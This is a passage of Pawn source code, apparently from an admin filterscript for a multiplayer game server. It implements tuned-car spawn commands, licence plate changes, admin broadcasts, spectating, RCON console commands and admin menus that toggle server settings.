	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(562,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
	    AddVehicleComponent(carid,1034); AddVehicleComponent(carid,1038); AddVehicleComponent(carid,1147); AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1073); ChangeVehiclePaintjob(carid,1);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar9", true)==0 || strcmp(cmdtext, "/ltc9", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(567,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
	    AddVehicleComponent(carid,1102); AddVehicleComponent(carid,1129); AddVehicleComponent(carid,1133); AddVehicleComponent(carid,1186); AddVehicleComponent(carid,1188); ChangeVehiclePaintjob(carid,1); AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1085); AddVehicleComponent(carid,1087); AddVehicleComponent(carid,1086);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar10", true)==0 || strcmp(cmdtext, "/ltc10", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(558,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
   		AddVehicleComponent(carid,1092); AddVehicleComponent(carid,1166); AddVehicleComponent(carid,1165); AddVehicleComponent(carid,1090);
	    AddVehicleComponent(carid,1094); AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1087); AddVehicleComponent(carid,1163);//SPOILER
	    AddVehicleComponent(carid,1091); ChangeVehiclePaintjob(carid,2);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar11", true)==0 || strcmp(cmdtext, "/ltc11", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(557,X,Y,Z,Angle,1,1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
		AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1081);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar12", true)==0 || strcmp(cmdtext, "/ltc12", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(535,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
		ChangeVehiclePaintjob(carid,1); AddVehicleComponent(carid,1109); AddVehicleComponent(carid,1115); AddVehicleComponent(carid,1117); AddVehicleComponent(carid,1073); AddVehicleComponent(carid,1010);
	    AddVehicleComponent(carid,1087); AddVehicleComponent(carid,1114); AddVehicleComponent(carid,1081); AddVehicleComponent(carid,1119); AddVehicleComponent(carid,1121);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar13", true)==0 || strcmp(cmdtext, "/ltc13", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) SendClientMessage(playerid,red,"Error: You already have a vehicle");
		else {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(562,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
  		AddVehicleComponent(carid,1034); AddVehicleComponent(carid,1038); AddVehicleComponent(carid,1147);
		AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1073); ChangeVehiclePaintjob(carid,0);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmd, "/lp", true) == 0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if (GetPlayerState(playerid) == 2)
		{
		new VehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(VehicleID);
        switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586, 449: return SendClientMessage(playerid,red,"ERROR: You can not tune this vehicle"); }
		new str[128], Float:pos[3];	format(str, sizeof(str), "%s", cmdtext[2]);
		SetVehicleNumberPlate(VehicleID, str);
		GetPlayerPos(playerid, pos[0], pos[1], pos[2]);	SetPlayerPos(playerid, pos[0]+1, pos[1], pos[2]);
		SetVehicleToRespawn(VehicleID); SetVehiclePos(VehicleID, pos[0], pos[1], pos[2]);
		TuneLCar(playerid);    PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		SendClientMessage(playerid, blue, "You have changed your licence plate");   CMDMessageToAdmins(playerid,"LP");
		} else {
		SendClientMessage(playerid,red,"Error: You have to be the driver of a vehicle to change its licence plate");	}
	} else	{
  	SendClientMessage(playerid,red,"ERROR: You need to be level 1 use this command");   }
	return 1;	}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
 	if(strcmp(cmd, "/write", true) == 0) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    tmp = strtok(cmdtext, idx);
		if(isnull(tmp)) {
			SendClientMessage(playerid, red, "USAGE: /write [Colour] [Text]");
			return SendClientMessage(playerid, red, "Colours: 0=black 1=white 2=red 3=orange 4=yellow 5=green 6=blue 7=purple 8=brown 9=pink");
	 	}
		new Colour;
		Colour = strval(tmp);
		if(Colour > 9 )	{
			SendClientMessage(playerid, red, "USAGE: /write [Colour] [Text]");
			return SendClientMessage(playerid, red, "Colours: 0=black 1=white 2=red 3=orange 4=yellow 5=green 6=blue 7=purple 8=brown 9=pink");
		}
		tmp = strtok(cmdtext, idx);

        CMDMessageToAdmins(playerid,"WRITE");

        if(Colour == 0) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(black,string); return 1;	}
        else if(Colour == 1) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_WHITE,string); return 1;	}
        else if(Colour == 2) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(red,string); return 1;	}
        else if(Colour == 3) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(orange,string); return 1;	}
        else if(Colour == 4) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(yellow,string); return 1;	}
        else if(Colour == 5) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_GREEN1,string); return 1;	}
        else if(Colour == 6) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_BLUE,string); return 1;	}
        else if(Colour == 7) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_PURPLE,string); return 1;	}
        else if(Colour == 8) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_BROWN,string); return 1;	}
        else if(Colour == 9) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_PINK,string); return 1;	}
	    } else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
        return 1;
        }


	return 1;
}

forward ResetCount(playerid);
public ResetCount(playerid)
{
	SetPVarInt(playerid, "TextSpamCount", 0);
}
forward ResetCommandCount(playerid);
public ResetCommandCount(playerid)
{
	SetPVarInt(playerid, "CommandSpamCount", 0);
}

//==============================================================================
#if defined ENABLE_SPEC

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	new x = 0;
	while(x!=MAX_PLAYERS) {
	    if( IsPlayerConnected(x) &&	GetPlayerState(x) == PLAYER_STATE_SPECTATING &&
			PlayerInfo[x][SpecID] == playerid && PlayerInfo[x][SpecType] == ADMIN_SPEC_TYPE_PLAYER )
   		{
   		    SetPlayerInterior(x,newinteriorid);
		}
		x++;
	}
}


//==============================================================================
//==============================================================================
public OnPlayerEnterVehicle(playerid, vehicleid) {
	for(new x=0; x<MAX_PLAYERS; x++) {
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid) {
	        TogglePlayerSpectating(x, 1);
	        PlayerSpectateVehicle(x, vehicleid);
	        PlayerInfo[x][SpecType] = ADMIN_SPEC_TYPE_VEHICLE;
		}
	}
    VID[playerid] = vehicleid;
    SetPlayerArmedWeapon(playerid, 0);
	return 1;
}

//==============================================================================
public OnPlayerStateChange(playerid, newstate, oldstate) {
	switch(newstate) {
		case PLAYER_STATE_ONFOOT: {
			switch(oldstate) {
				case PLAYER_STATE_DRIVER: OnPlayerExitVehicle(playerid,255);
				case PLAYER_STATE_PASSENGER: OnPlayerExitVehicle(playerid,255);
			}
		}
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
	    SetPlayerArmedWeapon(playerid, 0);
	}
	return 1;
}

#endif


//==============================================================================
public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(PlayerInfo[playerid][DoorsLocked] == 1) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),playerid,false,false);

	#if defined ENABLE_SPEC
	for(new x=0; x<MAX_PLAYERS; x++) {
    	if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid && PlayerInfo[x][SpecType] == ADMIN_SPEC_TYPE_VEHICLE) {
        	TogglePlayerSpectating(x, 1);
	        PlayerSpectatePlayer(x, playerid);
    	    PlayerInfo[x][SpecType] = ADMIN_SPEC_TYPE_PLAYER;
		}
	}
	#endif

	return 1;
}

//==============================================================================
#if defined ENABLE_SPEC

stock StartSpectate(playerid, specplayerid)
{
	for(new x=0; x<MAX_PLAYERS; x++) {
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid) {
	       AdvanceSpectate(x);
		}
	}
	SetPlayerInterior(playerid,GetPlayerInterior(specplayerid));
	TogglePlayerSpectating(playerid, 1);

	if(IsPlayerInAnyVehicle(specplayerid)) {
		PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specplayerid));
		PlayerInfo[playerid][SpecID] = specplayerid;
		PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_VEHICLE;
	}
	else {
		PlayerSpectatePlayer(playerid, specplayerid);
		PlayerInfo[playerid][SpecID] = specplayerid;
		PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_PLAYER;
	}
	new string[100], Float:hp, Float:ar;
	GetPlayerName(specplayerid,string,sizeof(string));
	GetPlayerHealth(specplayerid, hp);	GetPlayerArmour(specplayerid, ar);
	format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~w~%s - id:%d~n~< sprint - jump >~n~hp:%0.1f ar:%0.1f $%d", string,specplayerid,hp,ar,GetPlayerMoney(specplayerid) );
	GameTextForPlayer(playerid,string,25000,3);
	return 1;
}

stock StopSpectate(playerid)
{
	TogglePlayerSpectating(playerid, 0);
	PlayerInfo[playerid][SpecID] = INVALID_PLAYER_ID;
	PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_NONE;
	Spectating[playerid] = 0;
	GameTextForPlayer(playerid,"~n~~n~~n~~w~Spectate mode ended",1000,3);
	return 1;
}

stock AdvanceSpectate(playerid)
{
    if(ConnectedPlayers() == 2) { StopSpectate(playerid); return 1; }
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
	    for(new x=PlayerInfo[playerid][SpecID]+1; x<=MAX_PLAYERS; x++)
		{
	    	if(x == MAX_PLAYERS) x = 0;
	        if(IsPlayerConnected(x) && x != playerid)
			{
				if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] != INVALID_PLAYER_ID || (GetPlayerState(x) != 1 && GetPlayerState(x) != 2 && GetPlayerState(x) != 3))
				{
					continue;
				}
				else
				{
					StartSpectate(playerid, x);
					break;
				}
			}
		}
	}
	return 1;
}

stock ReverseSpectate(playerid)
{
    if(ConnectedPlayers() == 2) { StopSpectate(playerid); return 1; }
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
	    for(new x=PlayerInfo[playerid][SpecID]-1; x>=0; x--)
		{
	    	if(x == 0) x = MAX_PLAYERS;
	        if(IsPlayerConnected(x) && x != playerid)
			{
				if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] != INVALID_PLAYER_ID || (GetPlayerState(x) != 1 && GetPlayerState(x) != 2 && GetPlayerState(x) != 3))
				{
					continue;
				}
				else
				{
					StartSpectate(playerid, x);
					break;
				}
			}
		}
	}
	return 1;
}

//-------------------------------------------
#endif

//==============================================================================
EraseVehicle(vehicleid)
{
    for(new players=0;players<=MAX_PLAYERS;players++)
    {
        new Float:X,Float:Y,Float:Z;
        if (IsPlayerInVehicle(players,vehicleid))
        {
            GetPlayerPos(players,X,Y,Z);
            SetPlayerPos(players,X,Y,Z+2);
            SetVehicleToRespawn(vehicleid);
        }
        SetVehicleParamsForPlayer(vehicleid,players,0,1);
    }
    SetTimerEx("VehRes",3000,0,"d",vehicleid);
    return 1;
}

forward CarSpawner(playerid,model);
public CarSpawner(playerid,model)
{
	if(IsPlayerInAnyVehicle(playerid)) SendClientMessage(playerid, red, "You already have a car!");
 	else
	{
    	new Float:x, Float:y, Float:z, Float:angle;
	 	GetPlayerPos(playerid, x, y, z);
	 	GetPlayerFacingAngle(playerid, angle);
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
	    new vehicleid=CreateVehicle(model, x, y, z, angle, -1, -1, -1);
		PutPlayerInVehicle(playerid, vehicleid, 0);
		SetVehicleVirtualWorld(vehicleid, GetPlayerVirtualWorld(playerid));
		LinkVehicleToInterior(vehicleid, GetPlayerInterior(playerid));
		ChangeVehicleColor(vehicleid,0,7);
        PlayerInfo[playerid][pCar] = vehicleid;
	}
	return 1;
}

forward CarDeleter(vehicleid);
public CarDeleter(vehicleid)
{
    for(new i=0;i<MAX_PLAYERS;i++) {
        new Float:X,Float:Y,Float:Z;
    	if(IsPlayerInVehicle(i, vehicleid)) {
    	    RemovePlayerFromVehicle(i);
    	    GetPlayerPos(i,X,Y,Z);
        	SetPlayerPos(i,X,Y+3,Z);
	    }
	    SetVehicleParamsForPlayer(vehicleid,i,0,1);
	}
    SetTimerEx("VehRes",1500,0,"i",vehicleid);
}

forward VehRes(vehicleid);
public VehRes(vehicleid)
{
    DestroyVehicle(vehicleid);
}

public OnVehicleSpawn(vehicleid)
{
	for(new i=0;i<MAX_PLAYERS;i++)
	{
        if(vehicleid==PlayerInfo[i][pCar])
		{
		    CarDeleter(vehicleid);
	        PlayerInfo[i][pCar]=-1;
        }
	}
	return 1;
}
//==============================================================================
forward TuneLCar(VehicleID);
public TuneLCar(VehicleID)
{
	ChangeVehicleColor(VehicleID,0,7);
	AddVehicleComponent(VehicleID, 1010);  AddVehicleComponent(VehicleID, 1087);
}

//==============================================================================

public OnRconCommand(cmd[])
{
	if( strlen(cmd) > 50 || strlen(cmd) == 1 ) return print("Invalid command length (exceeding 50 characters)");

	if(strcmp(cmd, "ladmin", true)==0) {
		print("Rcon Commands");
		print("info, aka, pm, asay, ann, uconfig, chat");
		return true;
	}

	if(strcmp(cmd, "info", true)==0)
	{
	    new TotalVehicles = CreateVehicle(411, 0, 0, 0, 0, 0, 0, 1000);    DestroyVehicle(TotalVehicles);
		new numo = CreateObject(1245,0,0,1000,0,0,0);	DestroyObject(numo);
		new nump = CreatePickup(371,2,0,0,1000);	DestroyPickup(nump);
		new gz = GangZoneCreate(3,3,5,5);	GangZoneDestroy(gz);

		new model[250], nummodel;
		for(new i=1;i<TotalVehicles;i++) model[GetVehicleModel(i)-400]++;
		for(new i=0;i<250;i++) { if(model[i]!=0) {	nummodel++;	}	}

		new string[256];
		print(" ===========================================================================");
		printf("                           Server Info:");
		format(string,sizeof(string),"[ Players Connected: %d || Maximum Players: %d ] [Ratio %0.2f ]",ConnectedPlayers(),GetMaxPlayers(),Float:ConnectedPlayers() / Float:GetMaxPlayers() );
		printf(string);
		format(string,sizeof(string),"[ Vehicles: %d || Models %d || Players In Vehicle: %d ]",TotalVehicles-1,nummodel, InVehCount() );
		printf(string);
		format(string,sizeof(string),"[ InCar %d  ||  OnBike %d ]",InCarCount(),OnBikeCount() );
		printf(string);
		format(string,sizeof(string),"[ Objects: %d || Pickups %d  || Gangzones %d]",numo-1, nump, gz);
		printf(string);
		format(string,sizeof(string),"[ Players In Jail %d || Players Frozen %d || Muted %d ]",JailedPlayers(),FrozenPlayers(), MutedPlayers() );
	    printf(string);
	    format(string,sizeof(string),"[ Admins online %d  RCON admins online %d ]",AdminCount(), RconAdminCount() );
	    printf(string);
		print(" ===========================================================================");
		return true;
	}

	if(!strcmp(cmd, "pm", .length = 2))
	{
	    new arg_1 = argpos(cmd), arg_2 = argpos(cmd, arg_1),targetid = strval(cmd[arg_1]), message[128];

    	if ( !cmd[arg_1] || cmd[arg_1] < '0' || cmd[arg_1] > '9' || targetid > MAX_PLAYERS || targetid < 0 || !cmd[arg_2])
	        print("USAGE: \"pm <playerid> <message>\"");

	    else if ( !IsPlayerConnected(targetid) ) print("This player is not connected!");
    	else
	    {
	        format(message, sizeof(message), "[RCON] PM: %s", cmd[arg_2]);
	        SendClientMessage(targetid, COLOR_WHITE, message);
   	        printf("Rcon PM '%s' sent", cmd[arg_1] );
    	}
	    return true;
	}

	if(!strcmp(cmd, "asay", .length = 4))
	{
	    new arg_1 = argpos(cmd), message[128];

    	if ( !cmd[arg_1] || cmd[arg_1] < '0') print("USAGE: \"asay  <message>\" (MessageToAdmins)");
	    else
	    {
	        format(message, sizeof(message), "[RCON] MessageToAdmins: %s", cmd[arg_1]);
	        MessageToAdmins(COLOR_WHITE, message);
	        printf("Admin Message '%s' sent", cmd[arg_1] );
    	}
	    return true;
	}

	if(!strcmp(cmd, "ann", .length = 3))
	{
	    new arg_1 = argpos(cmd), message[128];
    	if ( !cmd[arg_1] || cmd[arg_1] < '0') print("USAGE: \"ann  <message>\" (GameTextForAll)");
	    else
	    {
	        format(message, sizeof(message), "[RCON]: %s", cmd[arg_1]);
	        GameTextForAll(message,3000,3);
	        printf("GameText Message '%s' sent", cmd[arg_1] );
    	}
	    return true;
	}

	if(!strcmp(cmd, "msg", .length = 3))
	{
	    new arg_1 = argpos(cmd), message[128];
    	if ( !cmd[arg_1] || cmd[arg_1] < '0') print("USAGE: \"msg  <message>\" (SendClientMessageToAll)");
	    else
	    {
	        format(message, sizeof(message), "[RCON]: %s", cmd[arg_1]);
	        SendClientMessageToAll(COLOR_WHITE, message);
	        printf("MessageToAll '%s' sent", cmd[arg_1] );
    	}
	    return true;
	}

	if(strcmp(cmd, "uconfig", true)==0)
	{
		UpdateConfig();
		print("Configuration Successfully Updated");
		return true;
	}

	if(!strcmp(cmd, "aka", .length = 3))
	{
	    new arg_1 = argpos(cmd), targetid = strval(cmd[arg_1]);

    	if ( !cmd[arg_1] || cmd[arg_1] < '0' || cmd[arg_1] > '9' || targetid > MAX_PLAYERS || targetid < 0)
	        print("USAGE: aka <playerid>");
	    else if ( !IsPlayerConnected(targetid) ) print("This player is not connected!");
    	else
	    {
			new tmp3[50], playername[MAX_PLAYER_NAME];
	  		GetPlayerIp(targetid,tmp3,50);
			GetPlayerName(targetid, playername, sizeof(playername));
			printf("AKA: [%s id:%d] [%s] %s", playername, targetid, tmp3, dini_Get("ladmin/config/aka.txt",tmp3) );
    	}
	    return true;
	}

	if(!strcmp(cmd, "chat", .length = 4)) {
	for(new i = 1; i < MAX_CHAT_LINES; i++) print(Chat[i]);
    return true;
	}

	return 0;
}


//==============================================================================
//							Menus
//==============================================================================

#if defined USE_MENUS
public OnPlayerSelectedMenuRow(playerid, row) {
  	new Menu:Current = GetPlayerMenu(playerid);
  	new string[128];

    if(Current == LMainMenu) {
        switch(row)
		{
 			case 0:
			{
				if(PlayerInfo[playerid][Level] >= 4) ShowMenuForPlayer(AdminEnable,playerid);
   				else {
   					SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	   				TogglePlayerControllable(playerid,true);
   				}
			}
			case 1:
			{
				if(PlayerInfo[playerid][Level] >= 4) ShowMenuForPlayer(AdminDisable,playerid);
   				else {
   					SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	   				TogglePlayerControllable(playerid,true);
   				}
			}
 			case 2: ShowMenuForPlayer(LWeather,playerid);
 			case 3: ShowMenuForPlayer(LTime,playerid);
   			case 4:	ShowMenuForPlayer(LVehicles,playerid);
			case 5:	ShowMenuForPlayer(LCars,playerid);
 			case 6:
            {
				if(PlayerInfo[playerid][Level] >= 2)
				{
        			if(IsPlayerInAnyVehicle(playerid))
					{
						new LVehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(LVehicleID);
					    switch(LModel)
						{
							case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
							{
								SendClientMessage(playerid,red,"ERROR: You can not tune this vehicle");  TogglePlayerControllable(playerid,true);
								return 1;
							}
						}
					    TogglePlayerControllable(playerid,false);	ShowMenuForPlayer(LTuneMenu,playerid);
			        }
					else { SendClientMessage(playerid,red,"ERROR: You do not have a vehicle to tune"); TogglePlayerControllable(playerid,true); }
		    	} else { SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command"); TogglePlayerControllable(playerid,true);	}
			}
  			case 7:
	  		{
	  			if(PlayerInfo[playerid][Level] >= 3) ShowMenuForPlayer(XWeapons,playerid);
			  	else SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command"); TogglePlayerControllable(playerid,true);
			}
			case 8:	 ShowMenuForPlayer(LTele,playerid);
			case 9:
			{
				new Menu:Currentxmenu = GetPlayerMenu(playerid);
	    		HideMenuForPlayer(Currentxmenu,playerid);   TogglePlayerControllable(playerid,true);
		    }
		}
		return 1;
	}//-------------------------------------------------------------------------
	if(Current == AdminEnable) {
		new adminname[MAX_PLAYER_NAME], file[256]; GetPlayerName(playerid, adminname, sizeof(adminname));
		format(file,sizeof(file),"ladmin/config/Config.ini");
		switch(row){
			case 0: { ServerInfo[AntiSwear] = 1; dini_IntSet(file,"AntiSwear",1); format(string,sizeof(string),"Administrator %s has enabled antiswear",adminname); SendClientMessageToAll(blue,string);	}
			case 1: { ServerInfo[NameKick] = 1; dini_IntSet(file,"NameKick",1); format(string,sizeof(string),"Administrator %s has enabled namekick",adminname); SendClientMessageToAll(blue,string);	}
			case 2:	{ ServerInfo[AntiSpam] = 1; dini_IntSet(file,"AntiSpam",1); format(string,sizeof(string),"Administrator %s has enabled antispam",adminname); SendClientMessageToAll(blue,string);	}
			case 3:	{ ServerInfo[MaxPing] = 1000; dini_IntSet(file,"MaxPing",1000); format(string,sizeof(string),"Administrator %s has enabled ping kick",adminname); SendClientMessageToAll(blue,string);	}
			case 4:	{ ServerInfo[ReadCmds] = 1; dini_IntSet(file,"ReadCmds",1); format(string,sizeof(string),"Administrator %s has enabled reading commands",adminname); MessageToAdmins(green,string);	}
			case 5:	{ ServerInfo[ReadPMs] = 1; dini_IntSet(file,"ReadPMs",1); format(string,sizeof(string),"Administrator %s has enabled reading pms",adminname); MessageToAdmins(green,string); }
			case 6:	{ ServerInfo[NoCaps] = 0; dini_IntSet(file,"NoCaps",0); format(string,sizeof(string),"Administrator %s has allowed captial letters in chat",adminname); SendClientMessageToAll(blue,string); }
			case 7:	{ ServerInfo[ConnectMessages] = 1; dini_IntSet(file,"ConnectMessages",1); format(string,sizeof(string),"Administrator %s has enabled connect messages",adminname); SendClientMessageToAll(blue,string); }
			case 8:	{ ServerInfo[AdminCmdMsg] = 1; dini_IntSet(file,"AdminCmdMessages",1); format(string,sizeof(string),"Administrator %s has enabled admin command messages",adminname); MessageToAdmins(green,string); }
			case 9:	{ ServerInfo[AutoLogin] = 1; dini_IntSet(file,"AutoLogin",1); format(string,sizeof(string),"Administrator %s has enabled auto login",adminname); SendClientMessageToAll(blue,string); }
            case 10: return ChangeMenu(playerid,Current,LMainMenu);
		 }
		return TogglePlayerControllable(playerid,true);
	}
	if(Current == AdminDisable) {
		new adminname[MAX_PLAYER_NAME], file[256]; GetPlayerName(playerid, adminname, sizeof(adminname));
		format(file,sizeof(file),"ladmin/config/Config.ini");
		switch(row){
			case 0: { ServerInfo[AntiSwear] = 0; dini_IntSet(file,"AntiSwear",0); format(string,sizeof(string),"Administrator %s has disabled antiswear",adminname); SendClientMessageToAll(blue,string);	}
			case 1: { ServerInfo[NameKick] = 0; dini_IntSet(file,"NameKick",0); format(string,sizeof(string),"Administrator %s has disabled namekick",adminname); SendClientMessageToAll(blue,string);	}
			case 2:	{ ServerInfo[AntiSpam] = 0; dini_IntSet(file,"AntiSpam",0); format(string,sizeof(string),"Administrator %s has disabled antispam",adminname); SendClientMessageToAll(blue,string);	}
			case 3:	{ ServerInfo[MaxPing] = 0; dini_IntSet(file,"MaxPing",0); format(string,sizeof(string),"Administrator %s has disabled ping kick",adminname); SendClientMessageToAll(blue,string);	}
			case 4:	{ ServerInfo[ReadCmds] = 0; dini_IntSet(file,"ReadCmds",0); format(string,sizeof(string),"Administrator %s has disabled reading commands",adminname); MessageToAdmins(green,string);	}
			case 5:	{ ServerInfo[ReadPMs] = 0; dini_IntSet(file,"ReadPMs",0); format(string,sizeof(string),"Administrator %s has disabled reading pms",adminname); MessageToAdmins(green,string); }
			case 6:	{ ServerInfo[NoCaps] = 1; dini_IntSet(file,"NoCaps",1); format(string,sizeof(string),"Administrator %s has prevented captial letters in chat",adminname); SendClientMessageToAll(blue,string); }
			case 7:	{ ServerInfo[ConnectMessages] = 0; dini_IntSet(file,"ConnectMessages",0); format(string,sizeof(string),"Administrator %s has disabled connect messages",adminname); SendClientMessageToAll(blue,string); }
			case 8:	{ ServerInfo[AdminCmdMsg] = 0; dini_IntSet(file,"AdminCmdMessages",0); format(string,sizeof(string),"Administrator %s has disabled admin command messages",adminname); MessageToAdmins(green,string); }
			case 9:	{ ServerInfo[AutoLogin] = 0; dini_IntSet(file,"AutoLogin",0); format(string,sizeof(string),"Administrator %s has disabled auto login",adminname); SendClientMessageToAll(blue,string); }
